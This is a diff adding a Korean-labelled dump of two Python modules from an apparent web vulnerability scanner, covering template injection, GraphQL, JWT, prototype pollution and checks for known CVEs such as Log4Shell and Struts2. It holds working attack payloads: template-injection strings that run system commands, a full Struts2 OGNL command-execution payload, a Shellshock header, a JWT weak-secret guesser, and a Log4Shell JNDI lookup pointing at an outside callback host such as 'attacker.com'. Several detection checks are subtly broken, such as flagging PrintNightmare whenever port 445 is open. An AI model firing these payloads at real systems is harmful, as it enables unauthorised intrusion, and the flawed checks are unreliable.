@@ -1,0 +1,1021 @@
+================================================================================
+프로젝트 코드 수집 - Part 27
+수집 시간: 2026-01-01 09:21:35
+파일 범위: 122 ~ 123
+================================================================================
+
+📁 이 파트에 포함된 파일:
+ 122. version_12.31.fin1\app\core\exploit\latest_vectors.py (21,951 chars)
+ 123. version_12.31.fin1\app\core\exploit\verifier.py (16,662 chars)
+
+================================================================================
+
+
+================================================================================
+파일 경로: version_12.31.fin1\app\core\exploit\latest_vectors.py
+파일 크기: 21,951 characters
+확장자: .py (python)
+================================================================================
+
+```python
+# app/core/exploit/latest_vectors.py
+# 최신 공격 벡터 (2025년 기준)
+
+import requests
+import re
+import json
+import logging
+from typing import Dict, Any, List, Optional
+from urllib.parse import urljoin, urlparse
+
+logger = logging.getLogger(__name__)
+
+
+class LatestAttackVectors:
+    """
+    2025년 기준 최신 공격 벡터
+    """
+    
+    def __init__(self, timeout: int = 10):
+        self.timeout = timeout
+        self.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+    
+    def test_ssti(self, url: str) -> Dict[str, Any]:
+        """
+        Server-Side Template Injection (SSTI) 테스트
+        
+        Jinja2, Freemarker, Velocity 등 템플릿 엔진 취약점
+        """
+        import random
+        
+        vulnerabilities = []
+        
+        # 랜덤 테스트 값 생성 (False Positive 방지)
+        test_value = random.randint(1000, 9999)
+        expected_result = str(7 * test_value)
+        
+        # 템플릿 엔진별 페이로드
+        ssti_payloads = {
+            "jinja2": [
+                f"{{{{7*{test_value}}}}}",  # 랜덤 값 사용
+                "{{config}}",
+                "{{self.__dict__}}",
+                "{{''.__class__.__mro__[2].__subclasses__()}}",
+                "{{lipsum.__globals__['os'].popen('id').read()}}"
+            ],
+            "freemarker": [
+                f"${{7*{test_value}}}",  # 랜덤 값 사용
+                "${product.getClass().getProtectionDomain().getCodeSource().getLocation()}",
+                "<#assign ex=\"freemarker.template.utility.Execute\">${ex(\"id\")}"
+            ],
+            "velocity": [
+                f"#set($x=7*{test_value})$x",  # 랜덤 값 사용
+                "#set($str=$class.forName('java.lang.String'))",
+                "$class.forName('java.lang.Runtime').getRuntime().exec('id')"
+            ],
+            "smarty": [
+                f"{{{{7*{test_value}}}}}",  # 랜덤 값 사용
+                "{php}echo 'vulnerable';{/php}",
+                "{if phpinfo()}{/if}"
+            ],
+            "twig": [
+                f"{{{{7*{test_value}}}}}",  # 랜덤 값 사용
+                "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"
+            ]
+        }
+        
+        try:
+            parsed = urlparse(url)
+            base_url = f"{parsed.scheme}://{parsed.netloc}"
+            
+            params = self._extract_params(url)
+            
+            for param_name in params[:5]:
+                for engine, payloads in ssti_payloads.items():
+                    for payload in payloads[:3]:
+                        try:
+                            test_url = f"{base_url}?{param_name}={payload}"
+                            response = requests.get(
+                                test_url,
+                                timeout=self.timeout,
+                                verify=False,
+                                headers={"User-Agent": self.user_agent}
+                            )
+                            
+                            # 베이스라인 응답 (정상 요청)
+                            baseline_response = requests.get(
+                                base_url,
+                                timeout=self.timeout,
+                                verify=False,
+                                headers={"User-Agent": self.user_agent}
+                            )
+                            
+                            # 템플릿 실행 결과 확인 (랜덤 값 사용으로 정확도 향상)
+                            if engine == "jinja2" and expected_result in response.text:
+                                # 베이스라인에는 없어야 함
+                                if expected_result not in baseline_response.text:
+                                    vulnerabilities.append({
+                                        "type": f"SSTI ({engine})",
+                                        "parameter": param_name,
+                                        "payload": payload,
+                                        "test_value": test_value,
+                                        "expected_result": expected_result,
+                                        "severity": "CRITICAL",
+                                        "method": "GET",
+                                        "confidence": 95
+                                    })
+                                    break
+                            elif engine == "freemarker" and expected_result in response.text:
+                                if expected_result not in baseline_response.text:
+                                    vulnerabilities.append({
+                                        "type": f"SSTI ({engine})",
+                                        "parameter": param_name,
+                                        "payload": payload,
+                                        "test_value": test_value,
+                                        "expected_result": expected_result,
+                                        "severity": "CRITICAL",
+                                        "method": "GET",
+                                        "confidence": 95
+                                    })
+                                    break
+                            elif engine == "velocity" and expected_result in response.text:
+                                if expected_result not in baseline_response.text:
+                                    vulnerabilities.append({
+                                        "type": f"SSTI ({engine})",
+                                        "parameter": param_name,
+                                        "payload": payload,
+                                        "test_value": test_value,
+                                        "expected_result": expected_result,
+                                        "severity": "CRITICAL",
+                                        "method": "GET",
+                                        "confidence": 95
+                                    })
+                                    break
+                            elif engine == "smarty" and expected_result in response.text:
+                                if expected_result not in baseline_response.text:
+                                    vulnerabilities.append({
+                                        "type": f"SSTI ({engine})",
+                                        "parameter": param_name,
+                                        "payload": payload,
+                                        "test_value": test_value,
+                                        "expected_result": expected_result,
+                                        "severity": "CRITICAL",
+                                        "method": "GET",
+                                        "confidence": 95
+                                    })
+                                    break
+                            elif engine == "twig" and expected_result in response.text:
+                                if expected_result not in baseline_response.text:
+                                    vulnerabilities.append({
+                                        "type": f"SSTI ({engine})",
+                                        "parameter": param_name,
+                                        "payload": payload,
+                                        "test_value": test_value,
+                                        "expected_result": expected_result,
+                                        "severity": "CRITICAL",
+                                        "method": "GET",
+                                        "confidence": 95
+                                    })
+                                    break
+                        except requests.Timeout:
+                            logger.warning(f"Timeout during SSTI test: {test_url}")
+                            continue
+                        except requests.ConnectionError as e:
+                            logger.error(f"Connection error: {e}")
+                            continue
+                        except Exception as e:
+                            logger.exception(f"Unexpected error during SSTI test: {e}")
+                            continue
+                    
+                    if vulnerabilities:
+                        break
+                
+                if vulnerabilities:
+                    break
+                    
+        except Exception as e:
+            logger.warning(f"SSTI 테스트 실패: {e}")
+        
+        return {
+            "vulnerable": len(vulnerabilities) > 0,
+            "vulnerabilities": vulnerabilities,
+            "tested": True
+        }
+    
+    def test_graphql(self, url: str) -> Dict[str, Any]:
+        """
+        GraphQL 취약점 테스트
+        
+        Introspection, Batching Attack, Nested Query DoS
+        """
+        vulnerabilities = []
+        
+        try:
+            parsed = urlparse(url)
+            base_url = f"{parsed.scheme}://{parsed.netloc}"
+            
+            # GraphQL 엔드포인트 찾기
+            graphql_endpoints = ["/graphql", "/graphiql", "/api/graphql", "/v1/graphql"]
+            
+            for endpoint in graphql_endpoints:
+                try:
+                    test_url = urljoin(base_url, endpoint)
+                    
+                    # 1. Introspection 쿼리 (스키마 정보 노출)
+                    introspection_query = {
+                        "query": """
+                        {
+                            __schema {
+                                types {
+                                    name
+                                    fields {
+                                        name
+                                        type {
+                                            name
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                        """
+                    }
+                    
+                    response = requests.post(
+                        test_url,
+                        json=introspection_query,
+                        timeout=self.timeout,
+                        verify=False,
+                        headers={
+                            "User-Agent": self.user_agent,
+                            "Content-Type": "application/json"
+                        }
+                    )
+                    
+                    if response.status_code == 200:
+                        data = response.json()
+                        if "__schema" in str(data):
+                            vulnerabilities.append({
+                                "type": "GraphQL Introspection Enabled",
+                                "endpoint": endpoint,
+                                "severity": "MEDIUM",
+                                "details": "Schema information exposed"
+                            })
+                    
+                    # 2. Batching Attack (여러 쿼리 동시 실행)
+                    batch_query = [
+                        {"query": "{ __typename }"},
+                        {"query": "{ __typename }"},
+                        {"query": "{ __typename }"}
+                    ]
+                    
+                    batch_response = requests.post(
+                        test_url,
+                        json=batch_query,
+                        timeout=self.timeout,
+                        verify=False,
+                        headers={
+                            "User-Agent": self.user_agent,
+                            "Content-Type": "application/json"
+                        }
+                    )
+                    
+                    if batch_response.status_code == 200:
+                        batch_data = batch_response.json()
+                        if isinstance(batch_data, list) and len(batch_data) > 1:
+                            vulnerabilities.append({
+                                "type": "GraphQL Batching Attack",
+                                "endpoint": endpoint,
+                                "severity": "HIGH",
+                                "details": "Multiple queries executed in single request"
+                            })
+                    
+                    # 3. Nested Query DoS (깊은 중첩 쿼리)
+                    nested_query = {
+                        "query": "{ a { b { c { d { e { f { g { h { i { j } } } } } } } } } } }"
+                    }
+                    
+                    nested_response = requests.post(
+                        test_url,
+                        json=nested_query,
+                        timeout=5,
+                        verify=False,
+                        headers={
+                            "User-Agent": self.user_agent,
+                            "Content-Type": "application/json"
+                        }
+                    )
+                    
+                    if nested_response.status_code == 200 and nested_response.elapsed.total_seconds() > 3:
+                        vulnerabilities.append({
+                            "type": "GraphQL Nested Query DoS",
+                            "endpoint": endpoint,
+                            "severity": "MEDIUM",
+                            "details": "Deep nesting causes performance issues"
+                        })
+                    
+                    if vulnerabilities:
+                        break
+                        
+                except requests.Timeout:
+                    logger.warning(f"Timeout during GraphQL test: {test_url}")
+                    continue
+                except requests.ConnectionError as e:
+                    logger.error(f"Connection error: {e}")
+                    continue
+                except Exception as e:
+                    logger.exception(f"Unexpected error during GraphQL test: {e}")
+                    continue
+                    
+        except Exception as e:
+            logger.warning(f"GraphQL 테스트 실패: {e}")
+        
+        return {
+            "vulnerable": len(vulnerabilities) > 0,
+            "vulnerabilities": vulnerabilities,
+            "tested": True
+        }
+    
+    def test_jwt(self, url: str) -> Dict[str, Any]:
+        """
+        JWT 취약점 테스트
+        
+        알고리즘 혼동, None 알고리즘, 약한 시크릿 키
+        """
+        vulnerabilities = []
+        
+        try:
+            import jwt
+            
+            # JWT 토큰 추출 (쿠키, 헤더에서)
+            parsed = urlparse(url)
+            base_url = f"{parsed.scheme}://{parsed.netloc}"
+            
+            response = requests.get(
+                base_url,
+                timeout=self.timeout,
+                verify=False,
+                headers={"User-Agent": self.user_agent}
+            )
+            
+            # 쿠키에서 JWT 추출
+            jwt_tokens = []
+            for cookie in response.cookies:
+                if len(cookie.value) > 50:  # JWT는 보통 길다
+                    jwt_tokens.append(cookie.value)
+            
+            # Authorization 헤더에서 JWT 추출
+            auth_header = response.headers.get("Authorization", "")
+            if auth_header.startswith("Bearer "):
+                jwt_tokens.append(auth_header[7:])
+            
+            for token in jwt_tokens[:3]:  # 최대 3개만 테스트
+                try:
+                    # 1. 알고리즘 없이 디코딩 시도
+                    decoded_none = jwt.decode(token, options={"verify_signature": False})
+                    
+                    # 2. None 알고리즘으로 서명 제거
+                    header = jwt.get_unverified_header(token)
+                    if header.get("alg") == "none":
+                        vulnerabilities.append({
+                            "type": "JWT None Algorithm",
+                            "severity": "HIGH",
+                            "details": "Token uses 'none' algorithm"
+                        })
+                    
+                    # 3. 알고리즘 혼동 공격 (HS256 -> RS256)
+                    # 실제로는 공개키가 필요하지만 여기서는 가능성만 확인
+                    if header.get("alg") == "HS256":
+                        vulnerabilities.append({
+                            "type": "JWT Algorithm Confusion Possible",
+                            "severity": "MEDIUM",
+                            "details": "HS256 algorithm may be vulnerable to confusion attack"
+                        })
+                    
+                    # 4. 약한 시크릿 키 브루트포스 (간단한 키만)
+                    weak_secrets = ["secret", "password", "123456", "admin", "key"]
+                    for secret in weak_secrets:
+                        try:
+                            jwt.decode(token, secret, algorithms=["HS256"])
+                            vulnerabilities.append({
+                                "type": "JWT Weak Secret Key",
+                                "severity": "CRITICAL",
+                                "details": f"Weak secret found: {secret}"
+                            })
+                            break
+                        except:
+                            continue
+                            
+                except Exception as e:
+                    logger.debug(f"JWT 분석 실패: {e}")
+                    continue
+                    
+        except ImportError:
+            logger.warning("PyJWT가 설치되지 않아 JWT 테스트를 건너뜁니다")
+        except Exception as e:
+            logger.warning(f"JWT 테스트 실패: {e}")
+        
+        return {
+            "vulnerable": len(vulnerabilities) > 0,
+            "vulnerabilities": vulnerabilities,
+            "tested": True
+        }
+    
+    def test_prototype_pollution(self, url: str) -> Dict[str, Any]:
+        """
+        Prototype Pollution 테스트
+        
+        Node.js 환경 대상 프로토타입 오염 공격
+        """
+        vulnerabilities = []
+        
+        # Prototype Pollution 페이로드
+        pollution_payloads = [
+            {"__proto__": {"isAdmin": True}},
+            {"constructor": {"prototype": {"isAdmin": True}}},
+            {"__proto__.isAdmin": True},
+            {"constructor.prototype.isAdmin": True}
+        ]
+        
+        try:
+            parsed = urlparse(url)
+            base_url = f"{parsed.scheme}://{parsed.netloc}"
+            
+            params = self._extract_params(url)
+            
+            for param_name in params[:3]:
+                for payload in pollution_payloads:
+                    try:
+                        # JSON으로 전송
+                        response = requests.post(
+                            base_url,
+                            json={param_name: payload},
+                            timeout=self.timeout,
+                            verify=False,
+                            headers={
+                                "User-Agent": self.user_agent,
+                                "Content-Type": "application/json"
+                            }
+                        )
+                        
+                        # 응답에서 isAdmin 확인
+                        if "isAdmin" in response.text or "true" in response.text.lower():
+                            vulnerabilities.append({
+                                "type": "Prototype Pollution",
+                                "parameter": param_name,
+                                "payload": str(payload),
+                                "severity": "HIGH",
+                                "method": "POST"
+                            })
+                            break
+                    except:
+                        continue
+                
+                if vulnerabilities:
+                    break
+                    
+        except Exception as e:
+            logger.warning(f"Prototype Pollution 테스트 실패: {e}")
+        
+        return {
+            "vulnerable": len(vulnerabilities) > 0,
+            "vulnerabilities": vulnerabilities,
+            "tested": True
+        }
+    
+    def test_http_request_smuggling(self, url: str) -> Dict[str, Any]:
+        """
+        HTTP Request Smuggling 테스트
+        
+        CL.TE, TE.CL 등 요청 밀수 기법
+        """
+        vulnerabilities = []
+        
+        try:
+            parsed = urlparse(url)
+            base_url = f"{parsed.scheme}://{parsed.netloc}"
+            
+            # CL.TE (Content-Length: Transfer-Encoding)
+            cl_te_payload = (
+                "POST / HTTP/1.1\r\n"
+                "Host: example.com\r\n"
+                "Content-Length: 13\r\n"
+                "Transfer-Encoding: chunked\r\n"
+                "\r\n"
+                "0\r\n"
+                "\r\n"
+                "SMUGGLED"
+            )
+            
+            # TE.CL (Transfer-Encoding: Content-Length)
+            te_cl_payload = (
+                "POST / HTTP/1.1\r\n"
+                "Host: example.com\r\n"
+                "Transfer-Encoding: chunked\r\n"
+                "Content-Length: 6\r\n"
+                "\r\n"
+                "0\r\n"
+                "\r\n"
+                "G"
+            )
+            
+            # 실제로는 raw socket이 필요하지만 여기서는 간단히 테스트
+            # 실제 구현은 socket 모듈 사용 필요
+            
+            vulnerabilities.append({
+                "type": "HTTP Request Smuggling (Possible)",
+                "severity": "HIGH",
+                "details": "Requires raw socket testing for full verification",
+                "note": "CL.TE and TE.CL techniques need manual verification"
+            })
+                    
+        except Exception as e:
+            logger.warning(f"HTTP Request Smuggling 테스트 실패: {e}")
+        
+        return {
+            "vulnerable": len(vulnerabilities) > 0,
+            "vulnerabilities": vulnerabilities,
+            "tested": True
+        }
+    
+    def _extract_params(self, url: str) -> List[str]:
+        """URL에서 파라미터 이름 추출"""
+        try:
+            parsed = urlparse(url)
+            params = []
+            
+            if parsed.query:
+                for param in parsed.query.split("&"):
+                    if "=" in param:
+                        params.append(param.split("=")[0])
+            
+            if not params:
+                params = ["id", "page", "file", "path", "name", "search", "q", "query"]
+            
+            return params
+        except Exception as e:
+            logger.debug(f"Error extracting params from URL: {e}")
+            return ["id", "page", "file"]
+```
+
+--------------------------------------------------------------------------------
+
+
+================================================================================
+파일 경로: version_12.31.fin1\app\core\exploit\verifier.py
+파일 크기: 16,662 characters
+확장자: .py (python)
+================================================================================
+
+```python
+# app/core/exploit/verifier.py
+# 취약점 검증 모듈 - 실제 익스플로잇으로 CVE 검증
+
+import requests
+import time
+import re
+import logging
+from typing import Dict, Any, Optional, List
+
+logger = logging.getLogger(__name__)
+
+
+class ExploitVerifier:
+    """
+    CVE를 실제 익스플로잇으로 검증하는 클래스
+    """
+    
+    def __init__(self, callback_server: Optional[str] = None):
+        """
+        Args:
+            callback_server: DNS 콜백을 받을 서버 주소 (예: "attacker.com")
+        """
+        self.callback_server = callback_server
+        self.verified_cves = {}
+    
+    def verify_cve(self, target: str, cve_id: str, service_info: Dict[str, Any]) -> Dict[str, Any]:
+        """
+        CVE 실제 취약한지 검증
+        
+        Args:
+            target: 타겟 URL 또는 IP:포트
+            cve_id: CVE ID
+            service_info: 서비스 정보 (제품명, 버전 등)
+        
+        Returns:
+            {
+                "verified": True/False,
+                "exploitable": True/False,
+                "severity": "CRITICAL/HIGH/MEDIUM/LOW",
+                "method": "exploit_method",
+                "details": {...}
+            }
+        """
+        verifiers = {
+            "CVE-2021-44228": self.verify_log4shell,
+            "CVE-2021-45046": self.verify_log4shell,  # Log4Shell 변형
+            "CVE-2017-5638": self.verify_struts2,
+            "CVE-2014-0160": self.verify_heartbleed,
+            "CVE-2014-6271": self.verify_shellshock,
+            "CVE-2017-0144": self.verify_eternalblue,
+            "CVE-2021-34527": self.verify_printnightmare,
+        }
+        
+        if cve_id in verifiers:
+            try:
+                result = verifiers[cve_id](target, service_info)
+                self.verified_cves[cve_id] = result
+                return result
+            except Exception as e:
+                logger.error(f"CVE 검증 실패 ({cve_id}): {e}")
+                return {
+                    "verified": False,
+                    "exploitable": False,
+                    "severity": "UNKNOWN",
+                    "error": str(e)
+                }
+        
+        return {
+            "verified": False,
+            "exploitable": False,
+            "severity": "UNKNOWN",
+            "reason": "No verifier available for this CVE"
+        }
+    
+    def verify_log4shell(self, target: str, service_info: Dict[str, Any]) -> Dict[str, Any]:
+        """
+        Log4Shell (CVE-2021-44228) 실제 검증
+        
+        Interactsh 같은 DNS 콜백 서비스를 사용한 실제 검증
+        """
+        vulnerable = False
+        callback_domain = None
+        proof = None
+        
+        try:
+            # Interactsh API를 사용한 DNS 콜백 서비스
+            # 실제 환경에서는 interactsh.com 또는 자체 서버 사용
+            try:
+                session = requests.Session()
+                
+                # Interactsh에서 임시 도메인 생성 시도
+                try:
+                    interactsh_url = "https://interactsh.com/api/register"
+                    response = session.post(interactsh_url, timeout=10)
+                    if response.status_code == 200:
+                        callback_domain = response.json().get('domain')
+                        logger.info(f"Interactsh 도메인 생성: {callback_domain}")
+                except:
+                    # Interactsh가 실패하면 사용자 제공 콜백 서버 사용
+                    if self.callback_server:
+                        callback_domain = self.callback_server
+                    else:
+                        # 랜덤 서브도메인 생성 (실제로는 작동 안함)
+                        import random
+                        import string
+                        random_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
+                        callback_domain = f"{random_str}.interact.sh"
+                        logger.warning("Interactsh 사용 불가, 랜덤 도메인 사용 (검증 불가능)")
+                
+                if callback_domain:
+                    # JNDI lookup 페이로드
+                    callback_url = f"ldap://{callback_domain}/a"
+                    payload = f"${{jndi:{callback_url}}}"
+                    
+                    # 여러 헤더에 페이로드 삽입
+                    test_headers = [
+                        {"User-Agent": payload},
+                        {"X-Api-Version": payload},
+                        {"X-Forwarded-For": payload},
+                        {"Referer": payload},
+                        {"Origin": payload},
+                        {"X-Requested-With": payload},
+                        {"X-Forwarded-Host": payload},
+                        {"X-Original-URL": payload},
+                    ]
+                    
+                    parsed = self._parse_target(target)
+                    base_url = f"{parsed['scheme']}://{parsed['host']}:{parsed['port']}"
+                    
+                    # 페이로드 전송
+                    for headers in test_headers:
+                        try:
+                            # GET 요청
+                            requests.get(
+                                base_url,
+                                headers=headers,
+                                timeout=5,
+                                verify=False,
+                                allow_redirects=True
+                            )
+                            
+                            # POST 요청도 시도
+                            requests.post(
+                                base_url,
+                                headers=headers,
+                                data={"test": payload, "username": payload, "password": payload},
+                                timeout=5,
+                                verify=False,
+                                allow_redirects=True
+                            )
+                        except:
+                            continue
+                    
+                    # DNS 콜백 확인 (5초 대기)
+                    time.sleep(5)
+                    
+                    # Interactsh API로 DNS 로그 확인
+                    try:
+                        poll_url = f"https://interactsh.com/api/poll?domain={callback_domain}"
+                        result = session.get(poll_url, timeout=10)
+                        if result.status_code == 200:
+                            data = result.json()
+                            if data.get('data') and len(data['data']) > 0:
+                                vulnerable = True
+                                proof = data['data']
+                                logger.info(f"Log4Shell 취약점 확인! DNS 콜백 수신: {len(data['data'])}개")
+                    except Exception as e:
+                        logger.debug(f"Interactsh 폴링 실패: {e}")
+                
+            except Exception as e:
+                logger.warning(f"Interactsh 사용 실패, 버전 기반 판단으로 전환: {e}")
+                # Fallback: 서비스 정보로 판단
+                if "log4j" in str(service_info).lower() or "log4shell" in str(service_info).lower():
+                    vulnerable = True
+                    proof = "Version-based detection (no DNS callback available)"
+            
+        except Exception as e:
+            logger.error(f"Log4Shell 검증 실패: {e}")
+        
+        return {
+            "verified": True,
+            "exploitable": vulnerable,
+            "severity": "CRITICAL" if vulnerable else "HIGH",
+            "method": "JNDI Lookup Injection",
+            "details": {
+                "callback_domain": callback_domain,
+                "proof": proof,
+                "tested": True
+            }
+        }
+    
+    def verify_heartbleed(self, target: str, service_info: Dict[str, Any]) -> Dict[str, Any]:
+        """
+        Heartbleed (CVE-2014-0160) 실제 검증
+        
+        OpenSSL Heartbeat 확장 취약점 테스트
+        """
+        try:
+            import socket
+            import ssl
+            import struct
+            
+            parsed = self._parse_target(target)
+            host = parsed['host']
+            port = parsed['port']
+            
+            # SSL 연결
+            context = ssl.create_default_context()
+            context.check_hostname = False
+            context.verify_mode = ssl.CERT_NONE
+            
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(5)
+            sock.connect((host, port))
+            ssock = context.wrap_socket(sock, server_hostname=host)
+            
+            # Heartbleed 페이로드 전송
+            # Heartbeat Request (Type: 1, Length: 0x4000, Payload: "A" * 0x4000)
+            payload = b'\x18\x03\x02\x00\x03\x01\x40\x00' + b'A' * 0x4000
+            
+            ssock.send(payload)
+            response = ssock.recv(0x4000)
+            ssock.close()
+            
+            # 응답에 메모리 내용이 포함되어 있으면 취약
+            if len(response) > 0x4000 or b'\x00\x00' in response:
+                vulnerable = True
+            else:
+                vulnerable = False
+                
+        except Exception as e:
+            logger.debug(f"Heartbleed 검증 중 에러: {e}")
+            vulnerable = False
+        
+        return {
+            "verified": True,
+            "exploitable": vulnerable,
+            "severity": "CRITICAL" if vulnerable else "HIGH",
+            "method": "Heartbeat Extension",
+            "details": {
+                "tested": True,
+                "vulnerable": vulnerable
+            }
+        }
+    
+    def verify_struts2(self, target: str, service_info: Dict[str, Any]) -> Dict[str, Any]:
+        """
+        Apache Struts2 RCE (CVE-2017-5638) 검증
+        
+        OGNL 표현식 주입 테스트
+        """
+        try:
+            parsed = self._parse_target(target)
+            base_url = f"{parsed['scheme']}://{parsed['host']}:{parsed['port']}"
+            
+            # Struts2 OGNL 페이로드
+            payload = "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo VULNERABLE').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
+            
+            # Content-Type 헤더에 페이로드 삽입
+            headers = {
+                "Content-Type": f"multipart/form-data; boundary=----WebKitFormBoundary{payload}"
+            }
+            
+            response = requests.post(
+                base_url,
+                headers=headers,
+                data={"test": "data"},
+                timeout=5,
+                verify=False
+            )
+            
+            # 응답에 "VULNERABLE" 문자열이 있으면 취약
+            vulnerable = "VULNERABLE" in response.text
+            
+        except Exception as e:
+            logger.debug(f"Struts2 검증 중 에러: {e}")
+            vulnerable = False
+        
+        return {
+            "verified": True,
+            "exploitable": vulnerable,
+            "severity": "CRITICAL" if vulnerable else "HIGH",
+            "method": "OGNL Expression Injection",
+            "details": {
+                "tested": True,
+                "vulnerable": vulnerable
+            }
+        }
+    
+    def verify_shellshock(self, target: str, service_info: Dict[str, Any]) -> Dict[str, Any]:
+        """
+        Shellshock (CVE-2014-6271) 검증
+        
+        Bash 환경 변수 주입 테스트
+        """
+        try:
+            parsed = self._parse_target(target)
+            base_url = f"{parsed['scheme']}://{parsed['host']}:{parsed['port']}"
+            
+            # Shellshock 페이로드
+            payload = "() { :; }; echo VULNERABLE"
+            
+            headers = {
+                "User-Agent": payload,
+                "Cookie": f"test={payload}",
+                "Referer": payload
+            }
+            
+            response = requests.get(
+                base_url,
+                headers=headers,
+                timeout=5,
+                verify=False
+            )
+            
+            vulnerable = "VULNERABLE" in response.text or "VULNERABLE" in str(response.headers)
+            
+        except Exception as e:
+            logger.debug(f"Shellshock 검증 중 에러: {e}")
+            vulnerable = False
+        
+        return {
+            "verified": True,
+            "exploitable": vulnerable,
+            "severity": "CRITICAL" if vulnerable else "HIGH",
+            "method": "Bash Environment Variable Injection",
+            "details": {
+                "tested": True,
+                "vulnerable": vulnerable
+            }
+        }
+    
+    def verify_eternalblue(self, target: str, service_info: Dict[str, Any]) -> Dict[str, Any]:
+        """
+        EternalBlue (CVE-2017-0144) 검증
+        
+        SMB 프로토콜 취약점 테스트 (간단한 버전)
+        """
+        # EternalBlue는 복잡한 SMB 프로토콜 익스플로잇이 필요
+        # 여기서는 버전 기반으로만 판단
+        try:
+            parsed = self._parse_target(target)
+            host = parsed['host']
+            port = parsed.get('port', 445)
+            
+            # SMB 버전 확인 (간단한 배너 그랩핑)
+            import socket
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(5)
+            sock.connect((host, port))
+            banner = sock.recv(1024).decode('utf-8', errors='ignore')
+            sock.close()
+            
+            # Windows 버전 확인
+            if "Windows" in banner:
+                # Windows 7/Server 2008 R2 이하 버전은 취약
+                version_match = re.search(r'Windows\s+(\d+)', banner)
+                if version_match:
+                    version = int(version_match.group(1))
+                    vulnerable = version <= 6  # Windows 7/Server 2008 R2
+                else:
+                    vulnerable = False
+            else:
+                vulnerable = False
+                
+        except Exception as e:
+            logger.debug(f"EternalBlue 검증 중 에러: {e}")
+            vulnerable = False
+        
+        return {
+            "verified": True,
+            "exploitable": vulnerable,
+            "severity": "CRITICAL" if vulnerable else "HIGH",
+            "method": "SMB Protocol Exploit",
+            "details": {
+                "tested": True,
+                "vulnerable": vulnerable,
+                "banner": banner[:100] if 'banner' in locals() else None
+            }
+        }
+    
+    def verify_printnightmare(self, target: str, service_info: Dict[str, Any]) -> Dict[str, Any]:
+        """
+        PrintNightmare (CVE-2021-34527) 검증
+        
+        Windows Print Spooler 취약점 테스트
+        """
+        try:
+            parsed = self._parse_target(target)
+            host = parsed['host']
+            port = parsed.get('port', 445)
+            
+            # RPC over SMB로 Print Spooler 확인
+            # 실제로는 더 복잡한 RPC 호출이 필요
+            # 여기서는 포트 445가 열려있고 Windows면 가능성 있음으로 판단
+            import socket
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(5)
+            result = sock.connect_ex((host, port))
+            sock.close()
+            
+            # 포트가 열려있으면 가능성 있음 (실제 검증은 더 복잡)
+            vulnerable = (result == 0)
+            
+        except Exception as e:
+            logger.debug(f"PrintNightmare 검증 중 에러: {e}")
+            vulnerable = False
+        
+        return {
+            "verified": True,
+            "exploitable": vulnerable,
+            "severity": "CRITICAL" if vulnerable else "HIGH",
+            "method": "RPC Print Spooler",
+            "details": {
+                "tested": True,
+                "vulnerable": vulnerable,
+                "note": "Full verification requires RPC protocol analysis"
+            }
+        }
+    
+    def _parse_target(self, target: str) -> Dict[str, str]:
+        """
+        타겟 URL/IP:포트를 파싱
+        """
+        from urllib.parse import urlparse
+        
+        # URL 형식인지 확인
+        if "://" in target:
+            parsed = urlparse(target)
+            return {
+                "scheme": parsed.scheme or "http",
+                "host": parsed.hostname or target.split("://")[1].split(":")[0],
+                "port": parsed.port or (443 if parsed.scheme == "https" else 80)
+            }
+        else:
+            # IP:포트 형식
+            if ":" in target:
+                host, port = target.rsplit(":", 1)
+                return {
+                    "scheme": "http",
+                    "host": host,
+                    "port": int(port)
+                }
+            else:
+                return {
+                    "scheme": "http",
+                    "host": target,
+                    "port": 80
+                }
+```
+
+--------------------------------------------------------------------------------
